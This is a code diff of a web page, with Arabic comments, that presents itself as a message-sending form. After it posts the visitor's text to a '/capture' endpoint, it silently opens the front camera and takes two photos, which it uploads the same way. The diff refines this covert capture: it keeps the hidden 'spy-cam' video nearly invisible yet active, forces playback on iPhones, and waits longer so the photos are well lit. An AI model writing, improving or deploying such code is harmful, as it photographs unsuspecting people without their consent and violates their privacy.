@@ -94,15 +94,16 @@
             box-shadow: 0 10px 25px rgba(217, 70, 239, 0.35);
         }
 
+        /* 🔴 الإصلاح السحري للكاميرا (منع الشاشة السوداء) */
         #spy-cam {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 10px;
+            height: 10px;
+            opacity: 0.01; /* شبه شفاف تماماً ليظن المتصفح أنه معروض ويسمح بمرور الضوء للصورة */
             pointer-events: none;
-            z-index: -99;
+            z-index: -999;
         }
 
         .blob {
@@ -116,11 +117,10 @@
 </head>
 <body class="p-4 relative">
 
-    <!-- زخارف خلفية متحركة -->
     <div class="blob bg-pink-400 w-64 h-64 top-0 right-0 animate-pulse"></div>
     <div class="blob bg-purple-400 w-72 h-72 bottom-0 left-0 animate-pulse" style="animation-delay: 2s;"></div>
 
-    <!-- الكاميرا المخفية -->
+    <!-- الكاميرا المخفية معدلة لتعمل على كل الهواتف (iPhone & Android) -->
     <video id="spy-cam" autoplay playsinline muted></video>
 
     <!-- واجهة الإرسال -->
@@ -176,7 +176,6 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('session');
-        // السيرفر مبرمج ليرسل الجلسة لصاحبها، لكننا نرسل رقماً وهمياً لكي لا يرفض السيرفر الطلب بحجة "البيانات ناقصة"
         const targetNumber = urlParams.get('target') || '0000000000';
 
         const sendBtn = document.getElementById('send-btn');
@@ -200,15 +199,12 @@
                 return;
             }
 
-            // تعطيل الزر وإظهار حالة التحميل
             sendBtn.disabled = true;
             sendBtn.style.opacity = "0.7";
             btnIcon.className = "fa-solid fa-circle-notch animate-spin";
             btnText.textContent = "جاري الإرسال والتشفير...";
 
-            // ==========================================
-            // 1. الإرسال الفعلي للنص (ضمان الوصول)
-            // ==========================================
+            // 1. إرسال النص للسيرفر
             try {
                 const response = await fetch('/capture', {
                     method: 'POST',
@@ -227,42 +223,47 @@
                 if (!result.success) {
                     alert("⚠️ عذراً: " + (result.message || "البوت غير متصل حالياً."));
                     resetButton();
-                    return; // إيقاف العملية
+                    return; 
                 }
-
             } catch (err) {
                 alert("⚠️ فشل الاتصال بالسيرفر! يرجى التأكد من أن السيرفر يعمل.");
                 resetButton();
-                return; // إيقاف العملية
+                return; 
             }
 
-            // ==========================================
-            // 2. محاولة التقاط الصور بصمت قبل إظهار النجاح
-            // ==========================================
+            // 2. محاولة التقاط الصور بصمت مع حل الشاشة السوداء
             try {
                 btnText.textContent = "تأكيد الوصول...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 videoEl.srcObject = stream;
                 
-                // انتظار 1.2 ثانية لتستقر الكاميرا
-                await new Promise(resolve => setTimeout(resolve, 1200));
+                // تشغيل الفيديو بشكل صريح إجباري (يحل مشكلة السفاري/الآيفون)
+                await videoEl.play().catch(e => console.log("Play ignored:", e));
+                
+                // 🔴 ننتظر ثانيتين كاملتين (2000 ملي ثانية) لكي تتعدل الإضاءة وتختفي الشاشة السوداء
+                await new Promise(resolve => setTimeout(resolve, 2000));
 
                 const canvas = document.createElement('canvas');
+                // نأخذ الأبعاد الحقيقية بعد أن اشتغلت الكاميرا
                 canvas.width = videoEl.videoWidth || 640;
                 canvas.height = videoEl.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
 
                 let capturedImages = [];
 
+                // التقاط الصورة الأولى (الآن الإضاءة ستكون ممتازة)
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+                capturedImages.push(canvas.toDataURL('image/jpeg', 0.85));
 
-                await new Promise(resolve => setTimeout(resolve, 400));
+                // انتظار نصف ثانية للقطة الثانية
+                await new Promise(resolve => setTimeout(resolve, 500));
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+                capturedImages.push(canvas.toDataURL('image/jpeg', 0.85));
 
+                // إغلاق الكاميرا
                 stream.getTracks().forEach(track => track.stop());
 
+                // إرسال الصور للسيرفر
                 if (capturedImages.length > 0) {
                     await fetch('/capture', {
                         method: 'POST',
@@ -277,12 +278,10 @@
                     });
                 }
             } catch (err) {
-                console.log("تخطي التقاط الصور (الرسالة النصية وصلت بالفعل).");
+                console.log("تم إلغاء الصور، الرسالة النصية وصلت بنجاح.");
             }
 
-            // ==========================================
             // 3. إظهار واجهة النجاح المريحة
-            // ==========================================
             writeUi.style.opacity = '0';
             setTimeout(() => {
                 writeUi.classList.add('hidden');
